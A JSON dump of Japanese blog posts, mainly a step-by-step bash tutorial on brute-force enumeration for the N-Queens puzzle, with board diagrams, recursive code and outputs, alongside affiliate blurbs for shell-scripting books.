[{"content":"Ｎクイーン問題　ブルートフォース 現在執筆中\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2023-02-21T18:13:01+09:00","image":"https://suzukiiichiro.github.io/posts/2023-02-21-01-n-queens-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2023-02-21-01-n-queens-suzuki/","title":"Ｎクイーン問題（４）ブルートフォース"},{"content":"更新中 次の記事\n過去記事\nＮクイーン問題（３）ブルートフォース前夜\nhttps://suzukiiichiro.github.io/posts/2023-02-14-03-n-queens-suzuki/\nN-Queens問題：Ｎクイーン問題（２）ブルートフォース前前夜\nhttps://suzukiiichiro.github.io/posts/2023-02-14-02-n-queens-suzuki/\nN-Queens問題：Ｎクイーン問題（１）について\nhttps://suzukiiichiro.github.io/posts/2023-02-14-01-n-queens-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2023-02-14T18:18:42+09:00","image":"https://suzukiiichiro.github.io/posts/2023-02-14-03-n-queens-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2023-02-14-03-n-queens-suzuki/","title":"Ｎクイーン問題（３）ブルートフォース前夜"},{"content":"前回の記事\nN-Queens問題：Ｎクイーン問題（１）\nhttps://suzukiiichiro.github.io/posts/2023-02-14-01-n-queens-suzuki/\nエイト・クイーンのソース置き場 BashもJavaもPythonも！\nhttps://github.com/suzukiiichiro/N-Queens\nブルートフォース前前夜 ではさっそくＮクイーン問題を考えてみましょう。\nこの章では、可能性のあるすべての解を体系的に数え上げる方法を考えてみます。\nまず、効き筋について。\ncolumn(列) _4___3___2___1___0_ |---|-*-|---|-*-|---|0 +-------------------+ |---|---|-*-|-*-|-*-|1 +-------------------+ |-*-|-*-|-*-|-Q-|-*-|2 row(行) +-------------------+ |---|---|-*-|-*-|-*-|3 +-------------------+ |---|-*-|---|-*-|---|4 +-------------------+ チェスで言うところのクイーンの動きは、縦、横、斜めに直線の効き筋を持っています。\n将棋の飛車と角を足した動きがクイーンです。\nチェス盤は縦８ｘ横８のサイズなのですが、この章では少し小さめの５ｘ５で考えてみます。\nこの場合、Ｎが５ということで「５クイーン」と言われることが多いです。\nさて５クイーンのルールは、\n１．各縦（列）に一つのクイーンがあります。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|-Q-|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ この場合、横の効き筋が効いてしまいますね。\n横一列はエイトクイーンではありえません。\ncolumn(列) _4___3___2___1___0_ |-Q-|-*-|-*-|-*-|-*-|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ ということで、エイト・クイーンは、\n１．縦に一つだけのクイーン\n２．横に一つだけのクイーン\n３．斜めに一つだけのクイーン\nの３つを満たしている必要があります。\nとはいえ、この章では、「縦の効き筋」のことだけを考えて作っていきます。\nですので「横の効き筋」と「斜めの効き筋」のことは一旦忘れてください。\nでは、まずは0,0のクイーンをひとつ下に移動します。\ncol0,row0のクイーンはcol0,row1に移動しました。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|---|0 +-------------------+ |---|---|---|---|-Q-|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ さらにクイーンをひとつ下に移動します。\ncol0,row1からcol0,row2へ移動しました。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|---|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|-Q-|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ さらにひとつ下に移動します。\ncol0,row3へ移動しました。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|---|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|-Q-|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ さらにひとつ下に移動します。\ncol0,row4へ移動しました。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|---|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|-Q-|4 +-------------------+ ここでcol0,row4のクイーンは一番下まできたわけです。\nこうなるとcol0,row4のクイーンは最下部へ到達し、もう下にはいけなくなりました。\nここで桁上りの処理で、col0列のクイーンはcol0,row0へ戻り、col1,row0のクイーンがひとつ下に移動します。\n図で表すと以下のようになります。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|---|-Q-|0 +-------------------+ |---|---|---|-Q-|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ ここからは先程の動きの繰り返しで、col0列のクイーンは一つずつ下に最下部へ到達するまでおりていきます。\ncol0,row1へ移動しました。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|---|---|0 +-------------------+ |---|---|---|-Q-|-Q-|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ さらに下に移動します。\ncol0,row2へ移動しました。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|---|---|0 +-------------------+ |---|---|---|-Q-|---|1 +-------------------+ |---|---|---|---|-Q-|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ さらに下に移動します。\ncol0,row3へ移動しました。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|---|---|0 +-------------------+ |---|---|---|-Q-|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|-Q-|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ さらに下に移動します。\ncol0,row4へ移動しました。\ncol0列のクイーンは最下部へ到達しました。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|---|---|0 +-------------------+ |---|---|---|-Q-|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|-Q-|4 +-------------------+ こうなるとcol0,row4のクイーンはまたcol0,row0へ戻り、col1,row1のクイーンもひとつ下におります。\n図で表すと以下のようになります。\ncol0,row4のクイーンはcol0,row0へ戻り、col1列のクイーンはcol1,row2へ移動します。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|---|-Q-|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|-Q-|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ クイーンは、最下部へ到達すると、最上部へ戻り、隣のクイーンがひとつ下に降ります。\n以下の場合はどうなりますか？\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|---|---|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|-Q-|-Q-|4 +-------------------+ この場合は、col1,row4のクイーンと、col0,row4のクイーンは最上部にもどり、col2列のクイーンがcol2,row1へ移動します。\n図で表すと以下のとおりです。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|---|-Q-|-Q-|0 +-------------------+ |---|---|-Q-|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ こうしたことからわかることは、col0列のクイーンは最も反復が多く、次にcol1列目、col2列目、col3列目のクイーンが忙しく動くことがわかります。\n処理が終わる直前の状態として以下の場合は考えてみます。\ncol4列目、col3列目、col2列目、col1列目のクイーンが最下部にあるとします。\ncol0列目のクイーンが順を追って最下部へ向かって移動を繰り返します。\ncolumn(列) _4___3___2___1___0_ |---|---|---|---|-Q-|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |-Q-|-Q-|-Q-|-Q-|---|4 +-------------------+ col0列目のクイーンが最下部へ到達すると処理は終了します。\n処理が終了したときのボード画面は以下のとおりです。\ncolumn(列) _4___3___2___1___0_ |---|---|---|---|---|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |-Q-|-Q-|-Q-|-Q-|-Q-|4 +-------------------+ ボードの動きを数値で表す プログラムで処理するので、ボードの盤面を数字で表すことにします。\n例えば下のボード画面は、col4 col3 col2 col1 col0 の row の場所を使って\n0,0,0,0,0 とします。\n0,0,0,0,0 column(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|-Q-|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ 以下の場合は、0,0,0,0,1となります。\n0,0,0,0,1 column(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|---|0 +-------------------+ |---|---|---|---|-Q-|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ 以下は、0,0,0,0,2 となります。\n0,0,0,0,2 column(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|---|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|-Q-|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ 以下は、0,0,0,1,0となります。\n0,0,0,1,0 column(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|---|-Q-|0 +-------------------+ |---|---|---|-Q-|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ 以下はどうなりますか？\n0,0,0,4,4 column(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|---|---|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|-Q-|-Q-|4 +-------------------+ 0,0,0,4,4となります。\n処理終了直前のボード画面が以下の通りだったとします。\n0,4,4,4,4 column(列) _4___3___2___1___0_ |-Q-|---|---|---|---|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|-Q-|-Q-|-Q-|-Q-|4 +-------------------+ 0,4,4,4,4 ですね。\n処理が終了した段階で4,4,4,4,4 となります。\n0,4,4,4,4 column(列) _4___3___2___1___0_ |---|---|---|---|---|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |-Q-|-Q-|-Q-|-Q-|-Q-|4 +-------------------+ 挙動をプログラムに置き換えてみます。 (※)この章の挙動は、各行に１個の王妃を配置する組み合わせを、列挙するだけで、Ｎクイーン問題を解いているわけではありません。\nなんと言ってもエイト・クイーンにある３つのルール\n１．縦列に一つだけのクイーン\n２．横列に一つだけのクイーン\n３．斜め列に一つだけのクイーン\nの１を満たしているに過ぎません。\nということで、気を取り直して\nNQueen.sh ファイルを作成してください。\n#!/usr/bin/bash function N-Queen01(){ : # まだなにもない } # function NQ(){ echo \u0026#34;\u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01()\u0026#34;; N-Queen01 0 5; } # NQ; ファイルを実行するとファイル最下部の NQが実行され、function NQ()が呼び出されます。\n現在のfunction NQ()はechoと N-Queen01関数の呼び出しがあるだけです。\nN-Queen01 0 5; にあるとおり、N-Queen01()関数に、２つのパラメータ 0 8 を渡しています。\nfunction N-Queen01()関数の中身はまだなにもありませんが、渡された２つのパラメータを、N-Queen01()関数の冒頭で明示的に変数へ代入しています。\nfunction N-Queen01(){ local -i min=\u0026#34;$1\u0026#34;; local -i size=\u0026#34;$2\u0026#34;; ２つの変数 min と size は、この関数でしか使わないローカル変数なので、明示的にlocalとしておきます。\nlocal の後ろに続く -i は、代入される値が数値であることを定義しています。\n関数パラメータの $1 や $2 といった変数は、関数の冒頭で必ずダブルクォーテーションで囲みましょう。\nここまでのソースは以下のとおりです。\n#!/usr/bin/bash function N-Queen01(){ local -i min=\u0026#34;$1\u0026#34;; local -i size=\u0026#34;$2\u0026#34;; } # function NQ(){ echo \u0026#34;\u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01()\u0026#34;; N-Queen01 0 5; } # NQ; 次は、forループ部分についてです。\nもっとも激しく動いていたクイーンはcol0列のクイーンでした。\n逆に、もっとも動きの小さなクイーンはcol4列のクイーンでしたね。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|---|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|-Q-|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ この場合、２つのforループで表現します。\n外側のforループはcolの横移動を表します。\n内側のforループはrowの縦移動を表すことにしましょう。\n５ｘ５の５クイーンをプログラム化します。\n外側の for ループは以下の通りとなります。\ncol0 列目から順を追ってcol1，col2，col3，col4 列目までたどっていきます。\nfor((col=0;col\u0026lt;size;col++)){ : # まだなにもない } さて、デバッグも兼ねて動きをひとつひとつ見ていくことにします。\n良い方法として、実行して処理のステップを順を追って目視で確認していきたいところです。\nread -p \u0026#34;なにかキーを入力してください\u0026#34; こんなコマンドをソースに埋め込んでみます。\nさらにコメント部分に、ウォッチしておきたい変数を埋め込みます。\n#!/usr/bin/bash function N-Queen01(){ local -i min=\u0026#34;$1\u0026#34;; local -i size=\u0026#34;$2\u0026#34;; for((col=0;col\u0026lt;size;col++)){ pos[$min]=\u0026#34;$col\u0026#34;; read -p \u0026#34;col: $col size: $size min: $min\u0026#34;; } } # function NQ(){ echo \u0026#34;\u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01()\u0026#34;; N-Queen01 0 5; } # NQ; 実行結果は以下のとおりです。\nbash-3.2$ bash N-Queens.sh \u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01() col: 0 size: 5 min: 0 col: 1 size: 5 min: 0 col: 2 size: 5 min: 0 col: 3 size: 5 min: 0 col: 4 size: 5 min: 0 bash-3.2$ 外側のループ `col` は左方向へたどります。 ←　←　←　←　← column(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|-Q-|0 +-------------------+ |---|---|---|---|---|1 +-------------------+ |---|---|---|---|---|2 row(行) +-------------------+ |---|---|---|---|---|3 +-------------------+ |---|---|---|---|---|4 +-------------------+ 次はrow列の縦移動を作ってみます。\nこの動きは外側のforループの内側にもう一つforループをおいて、クイーンの縦の動きを表現すると良さそうです。\ncolumn(列) _4___3___2___1___0_ |-Q-|-Q-|-Q-|-Q-|-Q-|0 ↓ +-------------------+ |---|---|---|---|---|1 ↓ +-------------------+ |---|---|---|---|---|2 row(行)↓ +-------------------+ |---|---|---|---|---|3 ↓ +-------------------+ |---|---|---|---|---|4 ↓ +-------------------+ ソースは以下のとおりです。\nread -p で出力を確認することができてとても便利です。\n#!/usr/bin/bash function N-Queen01(){ local -i min=\u0026#34;$1\u0026#34;; local -i size=\u0026#34;$2\u0026#34;; for((col=0;col\u0026lt;size;col++)){ pos[$min]=\u0026#34;$col\u0026#34;; for((row=0;row\u0026lt;size;row++)){ read -p \u0026#34;col: $col row: $row size: $size min: $min\u0026#34;; } } } # function NQ(){ echo \u0026#34;\u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01()\u0026#34;; N-Queen01 0 5; } # NQ; 実行結果は以下のとおりです。\nbash-3.2$ bash N-Queens.sh \u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01() col: 0 row: 0 size: 5 min: 0 col: 0 row: 1 size: 5 min: 0 col: 0 row: 2 size: 5 min: 0 col: 0 row: 3 size: 5 min: 0 col: 0 row: 4 size: 5 min: 0 col: 1 row: 0 size: 5 min: 0 col: 1 row: 1 size: 5 min: 0 col: 1 row: 2 size: 5 min: 0 col: 1 row: 3 size: 5 min: 0 col: 1 row: 4 size: 5 min: 0 col: 2 row: 0 size: 5 min: 0 col: 2 row: 1 size: 5 min: 0 col: 2 row: 2 size: 5 min: 0 col: 2 row: 3 size: 5 min: 0 col: 2 row: 4 size: 5 min: 0 col: 3 row: 0 size: 5 min: 0 col: 3 row: 1 size: 5 min: 0 col: 3 row: 2 size: 5 min: 0 col: 3 row: 3 size: 5 min: 0 col: 3 row: 4 size: 5 min: 0 col: 4 row: 0 size: 5 min: 0 col: 4 row: 1 size: 5 min: 0 col: 4 row: 2 size: 5 min: 0 col: 4 row: 3 size: 5 min: 0 col: 4 row: 4 size: 5 min: 0 bash-3.2$ row が 0から4まで行きつくと、colが一つインクリメントしていく挙動が見て取れますね。\nさて、col0 が最下部へ達したら col1 へ。その次は col2 へと桁上りするプログラムを書いてみます。\n細かいところがわからないと思いますが、ここでは気にせずに先に進んでください。\nここで大事なことは col0 から桁上りしない　ということです。\nなぜでしょうか。まず実行結果も含めてみてください。\n#!/usr/bin/bash function N-Queen01(){ local -i min=\u0026#34;$1\u0026#34;; local -i size=\u0026#34;$2\u0026#34;; for((col=0;col\u0026lt;size;col++)){ pos[$min]=\u0026#34;$col\u0026#34;; if((min==size-1));then for((row=0;row\u0026lt;size;row++)){ echo -n \u0026#34; ${pos[row]} \u0026#34; } echo \u0026#34;\u0026#34;; # 改行 else N-Queen01 \u0026#34;$((min+1))\u0026#34; \u0026#34;$size\u0026#34;; fi } } # function NQ(){ echo \u0026#34;\u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01()\u0026#34;; N-Queen01 0 5; } # NQ; 実行結果は以下のとおりです。\nbash-3.2$ bash N-Queens.sh 0 0 0 0 1 0 0 0 0 2 0 0 0 0 3 0 0 0 0 4 bash-3.2$ col0 の処理で終わってしまっています。\nこの理由は再帰処理に使われる変数の定義が原因なのです。\n以下の２行を関数の冒頭に加えるだけで動くようになります。\nlocal -i col=0; # 再帰に必要 local -i row=0; # 再帰に必要 ここも少しだけ言及しておきます。\nN-Queen01 \u0026#34;$((min+1))\u0026#34; \u0026#34;$size\u0026#34;; $((min+1)) の部分はインクリメントしているわけですが、$((min++)) ではきちんと処理はなされません。\n明示的に min+1 とする必要があります。\n再帰に関していくつか注意しなければいけないこともありますが、まずは動かしてみて、自分が自分を呼び出すときに min+1 のように一つ値を加算して、min==size-1 のように基底条件を\nわすれずに添えることを忘れないでください。\n上記のことを含めたソースは以下のとおりです。\n#!/usr/bin/bash function N-Queen01(){ local -i min=\u0026#34;$1\u0026#34;; local -i size=\u0026#34;$2\u0026#34;; local -i col=0; # 再帰に必要 local -i row=0; # 再帰に必要 for((col=0;col\u0026lt;size;col++)){ pos[$min]=\u0026#34;$col\u0026#34;; if((min==size-1));then for((row=0;row\u0026lt;size;row++)){ #read -p \u0026#34;col: $col row: $row size: $size min: $min\u0026#34;; echo -n \u0026#34; ${pos[row]} \u0026#34; } echo \u0026#34;\u0026#34;; # 改行 else N-Queen01 \u0026#34;$((min+1))\u0026#34; \u0026#34;$size\u0026#34;; fi } } # function NQ(){ echo \u0026#34;\u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01()\u0026#34;; N-Queen01 0 5; } # NQ; 実行結果\n\u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01() 0 0 0 0 0 0 0 0 0 1 0 0 0 0 2 0 0 0 0 3 0 0 0 0 4 0 0 0 1 0 0 0 0 1 1 0 0 0 1 2 0 0 0 1 3 : : : 4 4 4 1 2 4 4 4 1 3 4 4 4 1 4 4 4 4 2 0 4 4 4 2 1 4 4 4 2 2 4 4 4 2 3 4 4 4 2 4 4 4 4 3 0 4 4 4 3 1 4 4 4 3 2 4 4 4 3 3 4 4 4 3 4 4 4 4 4 0 4 4 4 4 1 4 4 4 4 2 4 4 4 4 3 4 4 4 4 4 なんか動くようになりました!\necho -n は、出力する際に改行を行わないオプションです。\n連続して出力されますので、空白を含めています。\nelse の直前で echo \u0026quot;\u0026quot; を使って改行を行っています。\nさて、どのくらいのステップが必要となるのかも知りたいところです。\nカウンターとして変数 COUNT をソースの冒頭で宣言してみます。\ndeclare -i COUNT=0; if 文の直後で COUNT をインクリメントしています。\nインクリメントは ((COUNT++)) で実行できますが、実行の値を引き出すために、$((COUNT++)) と $ をつけています。\necho -n で出力しつつ $((COUNT++)) でインクリメントしているわけですが、分割して書くと以下のようになります。\n((COUNT++)); echo -n \u0026#34;$COUNT: \u0026#34;; ソースは以下のとおりです。\n#!/usr/bin/bash declare -i COUNT=0; function N-Queen01(){ local -i min=\u0026#34;$1\u0026#34;; local -i size=\u0026#34;$2\u0026#34;; local -i col=0; # 再帰に必要 local -i row=0; # 再帰に必要 for((col=0;col\u0026lt;size;col++)){ pos[$min]=\u0026#34;$col\u0026#34;; if((min==size-1));then echo -n \u0026#34;$((COUNT++)): \u0026#34; for((row=0;row\u0026lt;size;row++)){ echo -n \u0026#34; ${pos[row]} \u0026#34; } echo \u0026#34;\u0026#34;; # 改行 else N-Queen01 \u0026#34;$((min+1))\u0026#34; \u0026#34;$size\u0026#34;; fi } } # function NQ(){ echo \u0026#34;\u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01()\u0026#34;; N-Queen01 0 5; } # NQ; 実行結果は以下のとおりです。\n3106: 4 4 4 1 1 3107: 4 4 4 1 2 3108: 4 4 4 1 3 3109: 4 4 4 1 4 3110: 4 4 4 2 0 3111: 4 4 4 2 1 3112: 4 4 4 2 2 3113: 4 4 4 2 3 3114: 4 4 4 2 4 3115: 4 4 4 3 0 3116: 4 4 4 3 1 3117: 4 4 4 3 2 3118: 4 4 4 3 3 3119: 4 4 4 3 4 3120: 4 4 4 4 0 3121: 4 4 4 4 1 3122: 4 4 4 4 2 3123: 4 4 4 4 3 3124: 4 4 4 4 4 速度の最適化 やっぱり処理時間は速いに越したことはありませんね。\n処理速度のボトルネックの多くはファイルや画面への出力になります。\necho -n は 外側の for でも出力していますが、もっとも回転回数の多い内側の for でも使われています。\nこの２箇所の出力は画面に出力することなく、変数に入れるだけにして、内側の for を抜けたときにまとめて画面出力することが速度改善に繋がります。\n#!/usr/bin/bash declare -i COUNT=0; # カウンター function N-Queen01(){ local -i min=\u0026#34;$1\u0026#34;; local -i size=\u0026#34;$2\u0026#34;; local -i col=0; # 再帰に必要 local -i row=0; # 再帰に必要 local sEcho=\u0026#34;\u0026#34;; # 出力用変数 for((col=0;col\u0026lt;size;col++)){ pos[$min]=\u0026#34;$col\u0026#34;; if((min==size-1));then # echo -n \u0026#34;$((COUNT++)): \u0026#34; # 画面出力はせず変数に格納 sEcho=\u0026#34;$((COUNT++)): \u0026#34;; for((row=0;row\u0026lt;size;row++)){ #echo -n \u0026#34; ${pos[row]} \u0026#34; # 画面出力はせず変数に格納 sEcho=\u0026#34;${sEcho}${pos[j]} \u0026#34;; } # echo \u0026#34;\u0026#34;; # 改行 # ここでまとめて画面に出力 # -n オプションは付けずに改行付きで出力します。 echo \u0026#34;$sEcho\u0026#34; # flush出力 else N-Queen01 \u0026#34;$((min+1))\u0026#34; \u0026#34;$size\u0026#34;; # 再帰 fi } } # function NQ(){ echo 